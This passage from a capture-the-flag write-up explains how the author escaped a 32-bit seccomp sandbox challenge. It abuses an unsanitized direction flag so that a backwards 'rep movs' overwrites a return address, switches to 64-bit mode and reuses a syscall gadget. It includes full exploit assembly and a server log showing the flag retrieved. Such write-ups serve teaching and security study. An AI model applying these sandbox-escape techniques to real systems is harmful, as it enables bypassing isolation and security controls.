 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```
The important observation here is that `instruction_pointer` reliably prevents any syscalls from code executing in low 4 GBytes.
### Starting User Code
The subroutine `go` reads up to 4 KBytes of input into temporary buffer.
Next it calls `copy_user_code` subrountine and finally transfers control to userland:
```
  asm volatile (
      "movq     %0, %%rax\n"
      "shlq     $32, %%rax\n"
      "movq     %1, %%rbx\n"
      "orq      %%rbx, %%rax\n"
      "push     %%rax\n"
      "retf\n"
      /* never reached */
      "int $3\n"
      :: "i"(0xf), /* ldt code segment selector. index: 1, table: 1, rpl: 3 */
         "i"(USER_CODE)
      : "rax", "rbx"
                );
```
The called `copy_user_code` ensures that userland code cannot contain any of the following bytes:
```
static struct opcode { char *name; char opcode; } opcodes[] = {
  { "iret",          0xcf },
  { "far jmp",       0xea },
  { "far call",      0x9a },
  { "far ret",       0xca },
  { "far ret",       0xcb },
  { "far jmp/call",  0xff },
  { NULL,            0x00 },
};
```
This blocks all well-known instructions to reload CS segment register.
In case CS segment register could be somehow loaded by user code, e.g. due to potential validation bugs, by using less-known or undocumented instructions or via self-modifying code, we could bypass restrictions on `__NR_open` and `__NR_mprotect` that are implemented by kernelmode.
I wasn't able to indentify any method to perform such CS reload.
Next, the subroutine copies validated code to userland code page and sets permissions to ensure that code cannot be modified:
```
  if (mprotect(USER_CODE, PAGE_SIZE, PROT_READ | PROT_EXEC) != 0)
    err(1, "mprotect");
```
## Exploitation
I identified only one issue during code review, where the `flags` register is not sanitized during transistion from userland to kernelland.
The potential exploitation scenario is setting `direction flag` (DF) in order to change semantics of some *string instructions* during kernelland execution.
Searching for `rep` prefix in provided binary gives interesting fragment from `path_ok` subroutine:
```
0000000000001340 :
    ...
    1376:       f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
```
The above corresponds to `memcpy` instruction during pathname validation code of `__NR_open`:
```
int path_ok(char *pathname, const char *p)
{
  if (!access_ok(p, MAX_PATH))
    return 0;
  memcpy(pathname, p, MAX_PATH);
  pathname[MAX_PATH - 1] = '\x00';
  if (strstr(pathname, "flag") != NULL)
    return 0;
  return 1;
}
```
The passed `pathname` buffer is allocated on `op_open` stack frame.
With `direction flag` set, the `rep movs` code decrements `rdi` and `rsi` registers on each iteration.
After coping the first qword of userland-supplied data into start of `pathname`, it continues to preceding stack addresses.
This vulnerability allows for controlling over 200 bytes (almost MAX_PATH) on stack just before allocated `pathname` buffer.
Running sandbox under debugger with trivial PoC userland code confirm ability to overwrite `op_open` return address.
This can be exploted as follows to execute user-supplied code in 64-bit mode:
```
        entry:
            mov     esp, 0xbef00000
            sub     esp, 0x200
            std
            push    0
            push    0xdead0000 + hijack_64 - entry
            mov     edi, 2                      /* __NR_open */
            lea     esi, [esp + 8]              /* path */
            xor     eax, eax                    /* mov  eax, 0xfffff000 */
            dec     eax
            shl     eax, 12
            push    eax
            ret
        hijack_64:
            /* Any code to execute in 64-bit mode */
```
Once in 64-bit mode, we can bypass SECCOMP `instruction_pointer` rule by executing pre-existing gadgets located above 4 GBytes.
One of the available gadgets is `syscall@plt` from the sandbox binary:
```
0000000000000ce0 :
 ce0:   ff 25 9a 22 20 00       jmp    QWORD PTR [rip+0x20229a]        # 202f80 
```
Using this gadget we can construct following code to read `flag` file:
```
        hijack_64:
            movabs  rax, 0x10000001e            /* address of kernel subroutine in kernelland entry page */
            mov     rbp, [rax]
            sub     rbp, 0x760                  /* move back to syscall@plt */
            /* open(pathname, O_RDONLY) */
            mov     rdi, __NR_open
            lea     rsi, [rip + pathname]
            mov     rdx, O_RDONLY
            call    syscall_gadget
            /* read(rax, rsp, 0x100) */
            mov     rdi, __NR_read
            mov     rsi, rax
            mov     rdx, rsp
            mov     rcx, 0x100
            call    syscall_gadget
            /* write(1, rsp, rax) */
            mov     rdi, __NR_write
            mov     rsi, 1
            mov     rdx, rsp
            mov     rcx, 0x100
            /* fall-through */
        syscall_gadget:
            push    rbp
            ret
        pathname:
           .asciz  "flag"
```
Running full exploit against CTF server gives the flag:
```
$ ./exploit.py
[+] Opening connection to sandbox-compat.ctfcompetition.com on port 1337: Done
[DEBUG] Received 0x29 bytes:
    'beef0000-bef00000 rw-p 00000000 00:00 0 \n'
[DEBUG] Received 0x73 bytes:
    'dead0000-dead1000 r-xp 00000000 00:00 0 \n'
    'fffff000-100001000 r-xp 00000000 00:00 0 \n'
    '[*] gimme some x86 32-bit code!\n'
...
[DEBUG] Sent 0x24 bytes:
    00000000  bc 00 00 f0  be 81 ec 00  02 00 00 fd  6a 00 68 24  │····│····│····│j·h$│
    00000010  00 ad de bf  02 00 00 00  8d 74 24 08  31 c0 48 c1  │····│····│·t$·│1·H·│
    00000020  e0 0c 50 c3                                         │··P·││
    00000024
[DEBUG] Sent 0x66 bytes:
    00000000  48 b8 1e 00  00 00 01 00  00 00 48 8b  28 48 81 ed  │H···│····│··H·│(H··│
    00000010  60 07 00 00  48 c7 c7 02  00 00 00 48  8d 35 3f 00  │`···│H···│···H│·5?·│
    00000020  00 00 48 c7  c2 00 00 00  00 e8 31 00  00 00 48 c7  │··H·│····│··1·│··H·│
    00000030  c7 00 00 00  00 48 89 c6  48 89 e2 48  c7 c1 00 01  │····│·H··│H··H│····│
    00000040  00 00 e8 18  00 00 00 48  c7 c7 01 00  00 00 48 c7  │····│···H│····│··H·│
    00000050  c6 01 00 00  00 48 89 e2  48 c7 c1 00  01 00 00 55  │····│·H··│H···│···U│
    00000060  c3 66 6c 61  67 00                                  │·fla│g·│
    00000066
[DEBUG] Sent 0x8 bytes:
    'deadbeef'
[DEBUG] Received 0x17 bytes:
    '[*] received 146 bytes\n'
[DEBUG] Received 0x110 bytes:
    00000000  5b 2a 5d 20  6c 65 74 27  73 20 67 6f  2e 2e 2e 0a  │[*] │let'│s go│...·│
    00000010  43 54 46 7b  48 65 6c 6c  30 5f 4e 34  43 6c 5f 49  │CTF{│Hell│0_N4│Cl_I│
    00000020  73 73 75 65  5f 35 31 21  7d 0a 00 00  00 00 00 00  │ssue│_51!│}···│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000110
[*] flag = "CTF{Hell0_N4Cl_Issue_51!}"
[*] Closed connection to sandbox-compat.ctfcompetition.com port 1337
```
## Conclusion
Overall very interesting challenge demonstrating one of the most obscure features of basic CPU functionality that we almost always take for granted: the `flags` register.